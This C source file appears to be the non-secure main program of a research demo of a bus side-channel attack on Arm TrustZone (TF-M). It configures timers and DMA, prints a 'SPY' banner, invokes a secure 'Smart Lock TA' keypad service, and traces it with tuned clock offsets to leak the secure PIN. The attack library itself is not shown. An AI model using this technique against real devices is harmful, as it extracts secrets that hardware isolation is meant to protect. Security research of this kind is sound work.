/*
 * Copyright (c) 2017-2021, Arm Limited. All rights reserved.
 *
 * SPDX-License-Identifier: BSD-3-Clause
 *
 */

#include "main.h"
#include "busSideChannel_lib.h"
#include "cache.h"
#include "tim.h"
#include "dma.h"

/**
 * \brief Platform peripherals and devices initialization.
 *        Can be overridden for platform specific initialization.
 *
 * \return  ARM_DRIVER_OK if the initialization succeeds
 */
__attribute__((weak)) int32_t tfm_ns_platform_init(void)
{
    stdio_init();

    return ARM_DRIVER_OK;
}

/**
 * \brief Platform peripherals and devices de-initialization.
 *        Can be overridden for platform specific initialization.
 *
 * \return  ARM_DRIVER_OK if the de-initialization succeeds
 */
__attribute__((weak)) int32_t tfm_ns_platform_uninit(void)
{
    stdio_uninit();

    return ARM_DRIVER_OK;
}

//__attribute__((weak))
int32_t tfm_ns_interface_dispatch(veneer_fn fn,
                                  uint32_t arg0, uint32_t arg1,
                                  uint32_t arg2, uint32_t arg3)
{
    int32_t result;

    /* TFM request protected by NS lock */
//    while (os_wrapper_mutex_acquire(ns_lock_handle, OS_WRAPPER_WAIT_FOREVER)
//            != OS_WRAPPER_SUCCESS);

    result = fn(arg0, arg1, arg2, arg3);

   // while (os_wrapper_mutex_release(ns_lock_handle) != OS_WRAPPER_SUCCESS);

    return result;
}
//__attribute__((weak))
enum tfm_status_e tfm_ns_interface_init(void)
{
//    void *handle;
//
//    handle = os_wrapper_mutex_create();
//    if (!handle) {
//        return TFM_ERROR_GENERIC;
//    }
//
//    ns_lock_handle = handle;
    return TFM_SUCCESS;
}

//------------------------------------------------------------------------------
#define PIN_LEN 4
int key_state = 0;
int current_key_state = 0;
int pin_idx = 0;
int dummy_pin_idx = 0;
char pin[PIN_LEN];
char dummy_pin[PIN_LEN];

__attribute__((optimize(0))) int read_keypad_get_trace_without_keypad(void)
{
    int is_pressed, mask = 0x1;
    int new_key_state = (1<<2); 
    // int new_key_state = get_keypad_state();

    for (int key = 0; key < 16; key++)
    // for (int key = 0; key < KYPD_NB_KEYS; key++)
    { 
        // detect rising edge
        is_pressed = (new_key_state & mask) & ~(key_state & mask);
        if (is_pressed)
          pin[pin_idx++] = key;
        else
          dummy_pin[dummy_pin_idx++] = key;
        // pin_idx = 0; 
        dummy_pin_idx = 0; //avoid buffer overflow
        mask <<= 1;
    }
    // key_state = new_key_state;
    // return (2*4 - dummy_pin_idx);
    return (PIN_LEN - pin_idx);
}    

__attribute__((optimize(0))) void read_pin_get_trace_without_keypad(){
  int pin_len = 2*4;
  while(pin_len){
    pin_len = read_keypad_get_trace_without_keypad();
  }
  dummy_pin_idx = 0;
  pin_idx = 0;
}

__attribute__((optimize(0))) int read_keypad_get_trace_without_keypad_no_keypress(void)
{
    int is_pressed, mask = 0x1;
    int new_key_state = (1<<5); 
    // int new_key_state = get_keypad_state();

    for (int key = 0; key < 4; key++)
    // for (int key = 0; key < KYPD_NB_KEYS; key++)
    { 
        // detect rising edge
        is_pressed = (new_key_state & mask) & ~(key_state & mask);
        if (is_pressed)
          pin[pin_idx++] = key;
        else
          dummy_pin[dummy_pin_idx++] = key;
        pin_idx = 0; 
        // dummy_pin_idx = 0; //avoid buffer overflow
        mask <<= 1;
    }
    // key_state = new_key_state;
    return (4*4 - dummy_pin_idx);
    // return (PIN_LEN - pin_idx);
}

__attribute__((optimize(0))) void read_pin_get_trace_without_keypad_no_keypress(){
  int pin_len = 2*4;
  while(pin_len){
    pin_len = read_keypad_get_trace_without_keypad_no_keypress();
  }
  dummy_pin_idx = 0;
  pin_idx = 0;
}
//------------------------------------------------------------------------------

//******************************************************************************
// Call TF-M Secure App  
//******************************************************************************
void read_pin() 
{
    psa_status_t status;
    status = psa_call(TFM_KEYPAD_SERVICE1_HANDLE, PSA_IPC_CALL, NULL, 0, NULL, 0);
    if (status != PSA_SUCCESS){
        LOG_MSG("psa_call is failed!\r\n");
        return;
    }
}

void set_black_color(){LOG_MSG("\033[0;30m");}
void set_bold_black_color(){LOG_MSG("\033[1;30m");}

void set_red_color(){LOG_MSG("\033[0;31m");}
void set_bold_red_color(){LOG_MSG("\033[1;31m");}

void set_green_color(){LOG_MSG("\033[0;32m");}
void set_bold_green_color(){LOG_MSG("\033[1;32m");}

void set_yellow_color(){LOG_MSG("\033[0;33m");}
void set_bold_yellow_color(){LOG_MSG("\033[1;33m");}

void set_blue_color(){LOG_MSG("\033[0;34m");}
void set_bold_blue_color(){LOG_MSG("\033[1;34m");}

void set_purple_color(){LOG_MSG("\033[0;35m");}
void set_bold_purple_color(){LOG_MSG("\033[1;35m");}

void set_cyan_color(){LOG_MSG("\033[0;36m");}
void set_bold_cyan_color(){LOG_MSG("\033[1;36m");}

void set_white_color(){LOG_MSG("\033[0;37m");}
void set_bold_white_color(){LOG_MSG("\033[1;37m");}

void set_grey_color(){LOG_MSG("\033[0;38m");}
void set_bold_grey_color(){LOG_MSG("\033[1;38m");}


void color_reset(){LOG_MSG("\033[0m");}

// #define PROFILE

/**
 * \brief main() function
 */
#ifndef __GNUC__
__attribute__((noreturn))
#endif
__attribute__((optimize(0))) int main(void)
{

    if (tfm_ns_platform_init() != ARM_DRIVER_OK) {
        /* Avoid undefined behavior if platform init failed */
        while(1);
    }

    // Configure peripherals
    MX_DMA_Init();
    MX_TIM2_Init();
    MX_TIM3_Init();
    MX_TIM4_Init();
    MX_TIM5_Init();
    MX_TIM7_Init();
    MX_TIM8_Init();
    enable_ICache();

    LOG_MSG("\n");
    LOG_MSG("[NS] Non-Secure system starting\r\n");

    // -------------------- read_pin_get_trace_without_keypad ------------------
    // #ifdef PROFILE
    //     get_trace(read_pin_get_trace_without_keypad, ICACHE_EN);
    //     get_trace_find_clocks(read_pin_get_trace_without_keypad, ICACHE_EN);
    // #else
    //     get_trace(read_pin_get_trace_without_keypad, ICACHE_EN);
    //     get_trace_find_clocks(read_pin_get_trace_without_keypad, ICACHE_EN);

    //     int first_clock = 982+18-2,
    //         next_iteration_time = 49,
    //         next_loop_time = 80;

    //     ICache_invalidation();
    //     autonomous_single_trace( first_clock,
    //                             next_iteration_time,
    //                             next_loop_time,
    //                             read_pin_get_trace_without_keypad);
    //     LOG_MSG("PIN = %d %d %d %d\n",pin[0], pin[1], pin[2], pin[3]);
    // #endif
    //--------------------------------------------------------------------------

    // ----------------------- read_pin ----------------------------------------

    #ifdef PROFILE
        get_trace(read_pin, ICACHE_EN);
        get_trace_find_clocks(read_pin, ICACHE_EN);

    #else
        int first_clock = 6600+18,
            next_iteration_time = 49,
            next_loop_time = 889;


        set_red_color();
        LOG_MSG("\n");
        LOG_MSG("****************************************\n");
        LOG_MSG("||                   SPY              ||\n");
        LOG_MSG("****************************************\n");
        LOG_MSG("[NS] Hardware Gadgets Are Configured\n");
        LOG_MSG("[NS] SPY Is Running\n");
        LOG_MSG("[NS] Invoking Smart Lock TA\n");
        LOG_MSG("\n");
        set_green_color();
        LOG_MSG("     ***********************************\n");
        LOG_MSG("     ||        SMART LOCK TA          ||\n");
        LOG_MSG("     ***********************************\n");
        LOG_MSG("     [TA] Reading Trusted Keypad\n");
        LOG_MSG("     [TA] Secure PIN = ");
        
        ICache_invalidation();
        autonomous_single_trace( first_clock,
                                next_iteration_time,
                                next_loop_time,
                                read_pin); 
        LOG_MSG("****************************************\n");
        LOG_MSG("****************************************\n");
        color_reset();
    #endif
    //--------------------------------------------------------------------------

    for (;;) {
    }
}

